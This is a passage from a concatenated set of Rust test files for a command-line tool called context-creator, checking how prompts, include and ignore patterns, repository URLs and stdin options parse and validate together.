        "context-creator",
        "--prompt",
        "Security review",
        "--include",
        "src/security/**",
        "--ignore",
        "**/*_test.rs",
    ]);

    assert_eq!(config.get_prompt(), Some("Security review".to_string()));
    assert_eq!(config.get_include_patterns(), vec!["src/security/**"]);
    assert_eq!(config.get_ignore_patterns(), vec!["**/*_test.rs"]);
}

#[test]
fn test_complex_pattern_combinations() {
    // Test multiple include and ignore patterns
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Review core functionality",
        "--include",
        "src/core/**",
        "--include",
        "src/utils/**",
        "--ignore",
        "node_modules/**",
        "--ignore",
        "target/**",
    ]);

    assert_eq!(
        config.get_prompt(),
        Some("Review core functionality".to_string())
    );
    assert_eq!(
        config.get_include_patterns(),
        vec!["src/core/**", "src/utils/**"]
    );
    assert_eq!(
        config.get_ignore_patterns(),
        vec!["node_modules/**", "target/**"]
    );
}

#[test]
fn test_ignore_without_prompt() {
    // Test that ignore works without prompt too
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
    ]);

    assert_eq!(config.get_prompt(), None);
    assert_eq!(config.get_include_patterns(), vec!["**/*.rs"]);
    assert_eq!(config.get_ignore_patterns(), vec!["target/**"]);
}

#[test]
fn test_backward_compatibility_paths() {
    // Ensure existing path arguments still work
    let config = Config::parse_from(["context-creator", "src/", "tests/"]);

    assert_eq!(config.get_prompt(), None);
    assert_eq!(
        config.get_directories(),
        vec![PathBuf::from("src/"), PathBuf::from("tests/")]
    );
    assert_eq!(config.get_include_patterns(), Vec::<String>::new());
    assert_eq!(config.get_ignore_patterns(), Vec::<String>::new());
}

#[test]
fn test_backward_compatibility_prompt_only() {
    // Ensure existing prompt-only usage still works
    let config = Config::parse_from(["context-creator", "--prompt", "Analyze this code"]);

    assert_eq!(config.get_prompt(), Some("Analyze this code".to_string()));
    assert_eq!(config.get_directories(), vec![PathBuf::from(".")]);
    assert_eq!(config.get_include_patterns(), Vec::<String>::new());
    assert_eq!(config.get_ignore_patterns(), Vec::<String>::new());
}

#[test]
fn test_backward_compatibility_include_only() {
    // Ensure existing include-only usage still works
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "src/**/*.rs",
        "--include",
        "tests/**/*.rs",
    ]);

    assert_eq!(config.get_prompt(), None);
    assert_eq!(
        config.get_include_patterns(),
        vec!["src/**/*.rs", "tests/**/*.rs"]
    );
    assert_eq!(config.get_ignore_patterns(), Vec::<String>::new());
}

#[test]
fn test_prompt_and_paths_now_allowed() {
    // This should now work - prompt and paths are now allowed together
    let config = Config::parse_from(["context-creator", "--prompt", "Analyze", "src/"]);

    assert_eq!(config.get_prompt(), Some("Analyze".to_string()));
    assert_eq!(config.paths, Some(vec![PathBuf::from("src/")]));

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_include_and_paths_now_allowed() {
    // This should now work - include and paths are now allowed together
    let config = Config::parse_from(["context-creator", "--include", "src/**", "src/"]);

    assert_eq!(config.get_include_patterns(), vec!["src/**"]);
    assert_eq!(config.paths, Some(vec![PathBuf::from("src/")]));

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_prompt_and_repo_now_allowed() {
    // This should now work - prompt and repo are now allowed together
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Analyze",
        "--repo",
        "https://github.com/owner/repo",
    ]);

    assert_eq!(config.get_prompt(), Some("Analyze".to_string()));
    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

// NEW FLEXIBLE COMBINATION TESTS - These should work after fixing ArgGroup restrictions

#[test]
fn test_prompt_with_paths() {
    // Should work: process specific directories with a prompt
    let temp_dir = TempDir::new().unwrap();
    let auth_dir = temp_dir.path().join("auth");
    let security_dir = temp_dir.path().join("security");
    std::fs::create_dir(&auth_dir).unwrap();
    std::fs::create_dir(&security_dir).unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Analyze security",
        auth_dir.to_str().unwrap(),
        security_dir.to_str().unwrap(),
    ]);

    assert_eq!(config.get_prompt(), Some("Analyze security".to_string()));
    assert_eq!(
        config.paths,
        Some(vec![auth_dir.clone(), security_dir.clone()])
    );
    assert_eq!(config.get_directories(), vec![auth_dir, security_dir]);

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_stdin_with_paths() {
    // Should work: read prompt from stdin, process specific paths
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    let tests_dir = temp_dir.path().join("tests");
    std::fs::create_dir(&src_dir).unwrap();
    std::fs::create_dir(&tests_dir).unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--stdin",
        src_dir.to_str().unwrap(),
        tests_dir.to_str().unwrap(),
    ]);

    assert!(config.read_stdin);
    assert_eq!(config.paths, Some(vec![src_dir.clone(), tests_dir.clone()]));
    assert_eq!(config.get_directories(), vec![src_dir, tests_dir]);

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_prompt_with_repo() {
    // Should work: analyze remote repo with specific prompt
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Find bugs",
        "--repo",
        "https://github.com/owner/repo",
    ]);

    assert_eq!(config.get_prompt(), Some("Find bugs".to_string()));
    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_stdin_with_include_patterns() {
    // Should work: stdin prompt with pattern filtering
    let config = Config::parse_from([
        "context-creator",
        "--stdin",
        "--include",
        "**/*.py",
        "--ignore",
        "tests/**",
    ]);

    assert!(config.read_stdin);
    assert_eq!(config.get_include_patterns(), vec!["**/*.py"]);
    assert_eq!(config.get_ignore_patterns(), vec!["tests/**"]);

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_include_with_repo() {
    // Should work: include patterns with repo (for future enhancement)
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "src/**/*.js",
        "--repo",
        "https://github.com/owner/repo",
    ]);

    assert_eq!(config.get_include_patterns(), vec!["src/**/*.js"]);
    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_all_options_combined() {
    // Should work: maximum flexibility like repomix
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Security audit",
        "--include",
        "src/**/*.rs",
        "--ignore",
        "target/**",
        "--output-file",
        "analysis.md",
    ]);

    assert_eq!(config.get_prompt(), Some("Security audit".to_string()));
    assert_eq!(config.get_include_patterns(), vec!["src/**/*.rs"]);
    assert_eq!(config.get_ignore_patterns(), vec!["target/**"]);
    assert_eq!(config.output_file, Some(PathBuf::from("analysis.md")));

    // This should FAIL validation because prompt + output_file is legitimately restricted
    assert!(config.validate().is_err());
}

#[test]
fn test_multiple_input_sources() {
    // Should work: process both local paths and patterns
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("local_src");
    let tests_dir = temp_dir.path().join("local_tests");
    std::fs::create_dir(&src_dir).unwrap();
    std::fs::create_dir(&tests_dir).unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--include",
        "external/**/*.js",
        src_dir.to_str().unwrap(),
        tests_dir.to_str().unwrap(),
    ]);

    assert_eq!(config.get_include_patterns(), vec!["external/**/*.js"]);
    assert_eq!(config.paths, Some(vec![src_dir, tests_dir]));

    // This should now work with flexible combinations
    assert!(config.validate().is_ok());
}

#[test]
fn test_empty_prompt_with_paths() {
    // Should work: empty prompt should be ignored, paths should work
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    std::fs::create_dir(&src_dir).unwrap();

    let config = Config::parse_from(["context-creator", "--prompt", "", src_dir.to_str().unwrap()]);

    assert_eq!(config.get_prompt(), None); // Empty prompt filtered out
    assert_eq!(config.paths, Some(vec![src_dir]));

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}
```

## tests/cli_flexibility_test.rs

Imports: clap::Parser, context_creator::cli::Config, std::path::PathBuf, tempfile::TempDir, config

Type references: clap::Parser.Parser, context_creator::cli::Config.Config, std::path::PathBuf.PathBuf, tempfile::TempDir.TempDir

```rust
use clap::Parser;
use context_creator::cli::Config;
use std::path::PathBuf;
use tempfile::TempDir;

// COMPREHENSIVE EDGE CASE TESTING FOR CLI FLEXIBILITY
// These tests verify that the CLI can handle complex combinations and edge cases
// All tests are written to pass after ArgGroup restrictions are removed

#[test]
fn test_prompt_with_multiple_paths() {
    // Should work: prompt with multiple directory paths
    let temp_dir = TempDir::new().unwrap();
    let auth_dir = temp_dir.path().join("auth");
    let security_dir = temp_dir.path().join("security");
    let core_dir = temp_dir.path().join("core");
    let integration_dir = temp_dir.path().join("integration");
    std::fs::create_dir(&auth_dir).unwrap();
    std::fs::create_dir(&security_dir).unwrap();
    std::fs::create_dir(&core_dir).unwrap();
    std::fs::create_dir(&integration_dir).unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Analyze multiple modules",
        auth_dir.to_str().unwrap(),
        security_dir.to_str().unwrap(),
        core_dir.to_str().unwrap(),
        integration_dir.to_str().unwrap(),
    ]);

    assert_eq!(
        config.get_prompt(),
        Some("Analyze multiple modules".to_string())
    );
    assert_eq!(
        config.paths,
        Some(vec![auth_dir, security_dir, core_dir, integration_dir])
    );

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_stdin_with_multiple_paths_and_patterns() {
    // Should work: stdin with paths and filtering patterns
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    let docs_dir = temp_dir.path().join("docs");
    std::fs::create_dir(&src_dir).unwrap();
    std::fs::create_dir(&docs_dir).unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--stdin",
        "--include",
        "**/*.rs",
        "--include",
        "**/*.toml",
        "--ignore",
        "target/**",
        "--ignore",
        "**/*_test.rs",
        src_dir.to_str().unwrap(),
        docs_dir.to_str().unwrap(),
    ]);

    assert!(config.read_stdin);
    assert_eq!(config.get_include_patterns(), vec!["**/*.rs", "**/*.toml"]);
    assert_eq!(
        config.get_ignore_patterns(),
        vec!["target/**", "**/*_test.rs"]
    );
    assert_eq!(config.paths, Some(vec![src_dir, docs_dir]));

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_prompt_with_repo_and_options() {
    // Should work: prompt with repo and additional options
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Security audit of external repo",
        "--repo",
        "https://github.com/owner/repo",
        "--max-tokens",
        "500000",
        "--verbose",
        "--progress",
    ]);

    assert_eq!(
        config.get_prompt(),
        Some("Security audit of external repo".to_string())
    );
    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );
    assert_eq!(config.max_tokens, Some(500000));
    assert!(config.verbose);
    assert!(config.progress);

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_complex_include_exclude_patterns() {
    // Should work: complex pattern combinations
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Find specific patterns",
        "--include",
        "src/**/*.{rs,py,js}",
        "--include",
        "tests/**/test_*.rs",
        "--include",
        "docs/**/*.md",
        "--ignore",
        "target/**",
        "--ignore",
        "node_modules/**",
        "--ignore",
        "**/*.pyc",
        "--ignore",
        ".git/**",
    ]);

    assert_eq!(
        config.get_prompt(),
        Some("Find specific patterns".to_string())
    );
    assert_eq!(
        config.get_include_patterns(),
        vec!["src/**/*.{rs,py,js}", "tests/**/test_*.rs", "docs/**/*.md"]
    );
    assert_eq!(
        config.get_ignore_patterns(),
        vec!["target/**", "node_modules/**", "**/*.pyc", ".git/**"]
    );

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_all_semantic_options_with_prompt() {
    // Should work: all semantic analysis options with prompt
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Deep semantic analysis",
        "--include",
        "src/**/*.rs",
        "--trace-imports",
        "--include-callers",
        "--include-types",
        "--semantic-depth",
        "5",
        "--enhanced-context",
    ]);

    assert_eq!(
        config.get_prompt(),
        Some("Deep semantic analysis".to_string())
    );
    assert_eq!(config.get_include_patterns(), vec!["src/**/*.rs"]);
    assert!(config.trace_imports);
    assert!(config.include_callers);
    assert!(config.include_types);
    assert_eq!(config.semantic_depth, 5);
    assert!(config.enhanced_context);

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_stdin_with_all_options() {
    // Should work: stdin with maximum option flexibility
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    std::fs::create_dir(&src_dir).unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--stdin",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
        "--max-tokens",
        "1000000",
        "--tool",
        "codex",
        "--verbose",
        "--progress",
        "--enhanced-context",
        "--trace-imports",
        "--semantic-depth",
        "3",
        src_dir.to_str().unwrap(),
    ]);

    assert!(config.read_stdin);
    assert_eq!(config.get_include_patterns(), vec!["**/*.rs"]);
    assert_eq!(config.get_ignore_patterns(), vec!["target/**"]);
    assert_eq!(config.max_tokens, Some(1000000));
    assert_eq!(config.llm_tool.command(), "codex");
    assert!(config.verbose);
    assert!(config.progress);
    assert!(config.enhanced_context);
    assert!(config.trace_imports);
    assert_eq!(config.semantic_depth, 3);
    assert_eq!(config.paths, Some(vec![src_dir]));

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_whitespace_prompt_handling() {
    // Edge case: various whitespace in prompts
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    std::fs::create_dir(&src_dir).unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "  \t  \n  ",
        src_dir.to_str().unwrap(),
    ]);

    assert_eq!(config.get_prompt(), None); // Whitespace-only prompt filtered out
    assert_eq!(config.paths, Some(vec![src_dir]));

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_very_long_prompt_with_paths() {
    // Edge case: very long prompt with paths
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    let tests_dir = temp_dir.path().join("tests");
    std::fs::create_dir(&src_dir).unwrap();
    std::fs::create_dir(&tests_dir).unwrap();

    let long_prompt = "a".repeat(10000);
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        &long_prompt,
        src_dir.to_str().unwrap(),
        tests_dir.to_str().unwrap(),
    ]);

    assert_eq!(config.get_prompt(), Some(long_prompt));
    assert_eq!(config.paths, Some(vec![src_dir, tests_dir]));

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_unicode_prompt_with_paths() {
    // Edge case: unicode characters in prompt
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    std::fs::create_dir(&src_dir).unwrap();

    let unicode_prompt = "åˆ†æžè¿™ä¸ªä»£ç åº“ ðŸš€ Analyze this codebase";
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        unicode_prompt,
        src_dir.to_str().unwrap(),
    ]);

    assert_eq!(config.get_prompt(), Some(unicode_prompt.to_string()));
    assert_eq!(config.paths, Some(vec![src_dir]));

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_many_include_patterns_with_prompt() {
    // Edge case: many include patterns
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Find all file types",
        "--include",
        "**/*.rs",
        "--include",
        "**/*.py",
        "--include",
        "**/*.js",
        "--include",
        "**/*.ts",
        "--include",
        "**/*.go",
        "--include",
        "**/*.java",
        "--include",
        "**/*.cpp",
        "--include",
        "**/*.c",
        "--include",
        "**/*.h",
        "--include",
        "**/*.hpp",
        "--include",
        "**/*.toml",
        "--include",
        "**/*.json",
        "--include",
        "**/*.yaml",
        "--include",
        "**/*.yml",
        "--include",
        "**/*.md",
    ]);

    assert_eq!(config.get_prompt(), Some("Find all file types".to_string()));
    assert_eq!(config.get_include_patterns().len(), 15);
    assert!(config
        .get_include_patterns()
        .contains(&"**/*.rs".to_string()));
    assert!(config
        .get_include_patterns()
        .contains(&"**/*.md".to_string()));

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_conflicting_include_ignore_patterns() {
    // Edge case: conflicting include/ignore patterns
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Test conflicting patterns",
        "--include",
        "src/**/*.rs",
        "--ignore",
        "src/**/*.rs", // Same pattern in both include and ignore
    ]);

    assert_eq!(
        config.get_prompt(),
        Some("Test conflicting patterns".to_string())
    );
    assert_eq!(config.get_include_patterns(), vec!["src/**/*.rs"]);
    assert_eq!(config.get_ignore_patterns(), vec!["src/**/*.rs"]);

    // This should pass validation after we fix restrictions (walker handles pattern conflicts)
    assert!(config.validate().is_ok());
}

// EDGE CASES THAT SHOULD STILL FAIL (legitimate restrictions)

#[test]
fn test_prompt_with_output_file_should_fail() {
    // Should fail: can't send to LLM and write to file simultaneously
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "This should fail",
        "--output-file",
        "output.md",
        "src/",
    ]);

    assert_eq!(config.get_prompt(), Some("This should fail".to_string()));
    assert_eq!(config.output_file, Some(PathBuf::from("output.md")));

    // This should FAIL validation (legitimate restriction)
    assert!(config.validate().is_err());
}

#[test]
fn test_copy_with_output_file_should_fail() {
    // Should fail: can't copy to clipboard and write to file simultaneously
    let config = Config::parse_from([
        "context-creator",
        "--copy",
        "--output-file",
        "output.md",
        "src/",
    ]);

    assert!(config.copy);
    assert_eq!(config.output_file, Some(PathBuf::from("output.md")));

    // This should FAIL validation (legitimate restriction)
    assert!(config.validate().is_err());
}

#[test]
fn test_no_input_source_should_fail() {
    // Should fail: no input source provided
    let config = Config::parse_from(["context-creator", "--max-tokens", "100000", "--verbose"]);

    assert_eq!(config.get_prompt(), None);
    assert_eq!(config.paths, None);
    assert_eq!(config.include, None);
    assert_eq!(config.repo, None);
    assert!(!config.read_stdin);

    // This should FAIL validation (no input source)
    assert!(config.validate().is_err());
}

// BACKWARD COMPATIBILITY VERIFICATION

#[test]
fn test_existing_usage_patterns_still_work() {
    // Verify all existing usage patterns continue to work

    // Pattern 1: Just paths
    let config1 = Config::parse_from(["context-creator", "src/"]);
    assert!(config1.validate().is_ok());

    // Pattern 2: Just prompt
    let config2 = Config::parse_from(["context-creator", "--prompt", "Analyze"]);
    assert!(config2.validate().is_ok());

    // Pattern 3: Just include patterns
    let config3 = Config::parse_from(["context-creator", "--include", "**/*.rs"]);
    assert!(config3.validate().is_ok());

    // Pattern 4: Just repo
    let config4 =
        Config::parse_from(["context-creator", "--repo", "https://github.com/owner/repo"]);
    assert!(config4.validate().is_ok());

    // Pattern 5: Prompt with include patterns (already supported)
    let config5 = Config::parse_from([
        "context-creator",
        "--prompt",
        "Test",
        "--include",
        "**/*.rs",
    ]);
    assert!(config5.validate().is_ok());
}

// INTEGRATION TESTS WITH REAL FILE OPERATIONS

#[test]
fn test_prompt_with_existing_directories() {
    // Should work: prompt with real existing directories
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    let tests_dir = temp_dir.path().join("tests");
    std::fs::create_dir(&src_dir).unwrap();
    std::fs::create_dir(&tests_dir).unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Analyze real directories",
        src_dir.to_str().unwrap(),
        tests_dir.to_str().unwrap(),
    ]);

    assert_eq!(
        config.get_prompt(),
        Some("Analyze real directories".to_string())
    );
    assert_eq!(config.paths, Some(vec![src_dir.clone(), tests_dir.clone()]));

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_stdin_with_nonexistent_directories_should_fail() {
    // Should fail: stdin with non-existent directories
    let config = Config::parse_from([
        "context-creator",
        "--stdin",
        "/nonexistent/directory",
        "/another/nonexistent/directory",
    ]);

    assert!(config.read_stdin);
    assert_eq!(
        config.paths,
        Some(vec![
            PathBuf::from("/nonexistent/directory"),
            PathBuf::from("/another/nonexistent/directory")
        ])
    );

    // This should FAIL validation (directories don't exist)
    assert!(config.validate().is_err());
}

#[test]
fn test_prompt_with_file_instead_of_directory_should_fail() {
    // Should fail: prompt with file instead of directory
    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("file.txt");
    std::fs::write(&file_path, "test content").unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "This should fail",
        file_path.to_str().unwrap(),
    ]);

    assert_eq!(config.get_prompt(), Some("This should fail".to_string()));
    assert_eq!(config.paths, Some(vec![file_path]));

    // This should FAIL validation (file is not a directory)
    assert!(config.validate().is_err());
}

// PERFORMANCE AND STRESS TESTS

#[test]
fn test_maximum_command_line_length() {
    // Edge case: very long command line with many options
    let mut args = vec![
        "context-creator",
        "--prompt",
        "Test maximum command line length",
        "--max-tokens",
        "1000000",
        "--tool",
        "gemini",
        "--verbose",
        "--progress",
        "--enhanced-context",
        "--trace-imports",
        "--include-callers",
        "--include-types",
        "--semantic-depth",
        "5",
    ];

    // Add many include patterns
    for i in 0..100 {
        args.push("--include");
        args.push(Box::leak(format!("pattern{i}/**/*.rs").into_boxed_str()));
    }

    // Add many ignore patterns
    for i in 0..100 {
        args.push("--ignore");
        args.push(Box::leak(format!("ignore{i}/**").into_boxed_str()));
    }

    let config = Config::parse_from(args);

    assert_eq!(
        config.get_prompt(),
        Some("Test maximum command line length".to_string())
    );
    assert_eq!(config.get_include_patterns().len(), 100);
    assert_eq!(config.get_ignore_patterns().len(), 100);

    // This should pass validation after we fix restrictions
    assert!(config.validate().is_ok());
}

#[test]
fn test_zero_length_patterns() {
    // Edge case: zero-length patterns
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Test empty patterns",
        "--include",
        "",
        "--ignore",
        "",
    ]);

    assert_eq!(config.get_prompt(), Some("Test empty patterns".to_string()));
    assert_eq!(config.get_include_patterns(), vec![""]);
    assert_eq!(config.get_ignore_patterns(), vec![""]);

    // This should pass validation after we fix restrictions (walker handles empty patterns)
    assert!(config.validate().is_ok());
}
```

## tests/cli_repo_paths_bug_test.rs

Imports: clap::Parser, context_creator::cli::Config, tempfile::TempDir, std::process::Command, assert_cmd::Command as AssertCommand, config

Type references: clap::Parser.Parser, context_creator::cli::Config.Config, tempfile::TempDir.TempDir, std::process::Command.Command, std::process::Command.Command

```rust
use clap::Parser;
use context_creator::cli::Config;
use tempfile::TempDir;

// TEST TO DEMONSTRATE BUG: --repo overwrites positional PATHS without warning

#[test]
fn test_repo_overwrites_paths_bug() {
    // This test demonstrates the bug where --repo silently overwrites PATHS
    // The user provides both a repo URL and local paths, but the paths are ignored

    let temp_dir = TempDir::new().unwrap();
    let local_src = temp_dir.path().join("src");
    let local_tests = temp_dir.path().join("tests");
    std::fs::create_dir(&local_src).unwrap();
    std::fs::create_dir(&local_tests).unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--repo",
        "https://github.com/owner/repo",
        local_src.to_str().unwrap(),
        local_tests.to_str().unwrap(),
    ]);

    // CLI parsing should work
    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );
    assert_eq!(
        config.paths,
        Some(vec![local_src.clone(), local_tests.clone()])
    );

    // FIXED: This should now FAIL validation with a clear error message
    // preventing the silent overwriting bug
    let result = config.validate();
    assert!(result.is_err());
    let error_msg = result.unwrap_err().to_string();
    assert!(error_msg.contains("Cannot specify both --repo and local paths"));

    // This test documents the fixed behavior:
    // Validation now fails with clear error instead of silently overwriting paths
}

#[test]
fn test_repo_with_paths_should_fail_validation() {
    // This test shows what SHOULD happen - validation should fail with clear error
    // when both --repo and paths are provided, since they conflict

    let temp_dir = TempDir::new().unwrap();
    let local_src = temp_dir.path().join("src");
    std::fs::create_dir(&local_src).unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--repo",
        "https://github.com/owner/repo",
        local_src.to_str().unwrap(),
    ]);

    // Parsing should work
    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );
    assert_eq!(config.paths, Some(vec![local_src]));

    // FIXED: This should now FAIL validation with a clear error message
    let result = config.validate();
    assert!(result.is_err());
    let error_msg = result.unwrap_err().to_string();
    assert!(error_msg.contains("Cannot specify both --repo and local paths"));
}

#[test]
fn test_repo_only_should_work() {
    // Sanity check: --repo by itself should work fine
    let config = Config::parse_from(["context-creator", "--repo", "https://github.com/owner/repo"]);

    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );
    assert_eq!(config.paths, None);

    // This should pass validation
    assert!(config.validate().is_ok());
}

#[test]
fn test_paths_only_should_work() {
    // Sanity check: paths by themselves should work fine
    let temp_dir = TempDir::new().unwrap();
    let local_src = temp_dir.path().join("src");
    std::fs::create_dir(&local_src).unwrap();

    let config = Config::parse_from(["context-creator", local_src.to_str().unwrap()]);

    assert_eq!(config.repo, None);
    assert_eq!(config.paths, Some(vec![local_src]));

    // This should pass validation
    assert!(config.validate().is_ok());
}

#[test]
fn test_repo_with_prompt_and_paths_complex_scenario() {
    // This tests a more complex scenario where user provides repo, prompt, and paths
    let temp_dir = TempDir::new().unwrap();
    let local_src = temp_dir.path().join("src");
    std::fs::create_dir(&local_src).unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "Compare local and remote code",
        "--repo",
        "https://github.com/owner/repo",
        local_src.to_str().unwrap(),
    ]);

    assert_eq!(
        config.get_prompt(),
        Some("Compare local and remote code".to_string())
    );
    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );
    assert_eq!(config.paths, Some(vec![local_src]));

    // FIXED: This should now FAIL validation with a clear error message
    // about conflicting input sources
    let result = config.validate();
    assert!(result.is_err());
    let error_msg = result.unwrap_err().to_string();
    assert!(error_msg.contains("Cannot specify both --repo and local paths"));
}

#[test]
fn test_repo_only_debug() {
    // Debug test to understand why repo-only commands are failing
    let config = Config::parse_from(["context-creator", "--repo", "https://github.com/owner/repo"]);

    println!("DEBUG: config.repo = {:?}", config.repo);
    println!("DEBUG: config.paths = {:?}", config.paths);
    println!("DEBUG: config.include = {:?}", config.include);

    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );
    assert_eq!(config.paths, None);

    // This should pass validation
    let result = config.validate();
    if let Err(e) = &result {
        println!("DEBUG: Validation error: {e}");
    }
    assert!(result.is_ok());
}

#[test]
fn test_repo_with_config_loading() {
    // Debug test to understand config loading behavior
    let mut config =
        Config::parse_from(["context-creator", "--repo", "https://github.com/owner/repo"]);

    println!(
        "DEBUG: Before load_from_file: config.paths = {:?}",
        config.paths
    );
    println!(
        "DEBUG: Before load_from_file: config.repo = {:?}",
        config.repo
    );

    // This mimics what happens in the main application
    config.load_from_file().unwrap();

    println!(
        "DEBUG: After load_from_file: config.paths = {:?}",
        config.paths
    );
    println!(
        "DEBUG: After load_from_file: config.repo = {:?}",
        config.repo
    );

    // This should pass validation
    let result = config.validate();
    if let Err(e) = &result {
        println!("DEBUG: Validation error: {e}");
    }
    assert!(result.is_ok());
}

#[test]
fn test_subprocess_repo_only_issue() {
    // Debug test to understand why the subprocess test is failing
    use std::process::Command;

    let mut cmd = Command::new("cargo");
    cmd.arg("run")
        .arg("--")
        .arg("--repo")
        .arg("https://github.com/fake/repo");

    let output = cmd.output().unwrap();

    println!(
        "DEBUG: Process exit code: {}",
        output.status.code().unwrap_or(-1)
    );
    println!(
        "DEBUG: Process stdout: {}",
        String::from_utf8_lossy(&output.stdout)
    );
    println!(
        "DEBUG: Process stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    // The process should fail because we don't have gh/git available, but NOT because of path validation
    let stderr_str = String::from_utf8_lossy(&output.stderr);

    // Check if the error is about path validation (which would be wrong)
    if stderr_str.contains("Cannot specify both --repo and local paths") {
        panic!("Process failed due to path validation error when it should not have: {stderr_str}");
    }
}

#[test]
fn test_binary_vs_cargo_run() {
    // Test both cargo run and Command::cargo_bin to see if they behave differently
    use assert_cmd::Command as AssertCommand;
    use std::process::Command;

    println!("=== Testing cargo run ===");
    let mut cmd = Command::new("cargo");
    cmd.arg("run")
        .arg("--")
        .arg("--repo")
        .arg("https://github.com/fake/repo");

    let output = cmd.output().unwrap();
    println!(
        "cargo run exit code: {}",
        output.status.code().unwrap_or(-1)
    );
    println!(
        "cargo run stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    println!("\n=== Testing Command::cargo_bin ===");
    let mut cmd = AssertCommand::cargo_bin("context-creator").unwrap();
    cmd.arg("--repo").arg("https://github.com/fake/repo");

    let output = cmd.output().unwrap();
    println!(
        "cargo_bin exit code: {}",
        output.status.code().unwrap_or(-1)
    );
    println!(
        "cargo_bin stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    // Both should fail with remote fetch error, not path validation error
    let stderr_str = String::from_utf8_lossy(&output.stderr);
    if stderr_str.contains("Cannot specify both --repo and local paths") {
        panic!("Binary process failed due to path validation error when it should not have: {stderr_str}");
    }
}
```

## tests/cli_test.rs

Imports: clap::Parser, context_creator, std::path::PathBuf, tempfile::TempDir, std::fs

Type references: clap::Parser.Parser, std::path::PathBuf.PathBuf, tempfile::TempDir.TempDir, fs, tempfile::TempDir.TempDir, fs, tempfile::TempDir.TempDir, fs, tempfile::TempDir.TempDir

```rust
use clap::Parser;
use context_creator::cli::{Config, LlmTool};
use std::path::PathBuf;

#[test]
fn test_llm_tool_default() {
    let config = Config::parse_from(["context-creator", "."]);
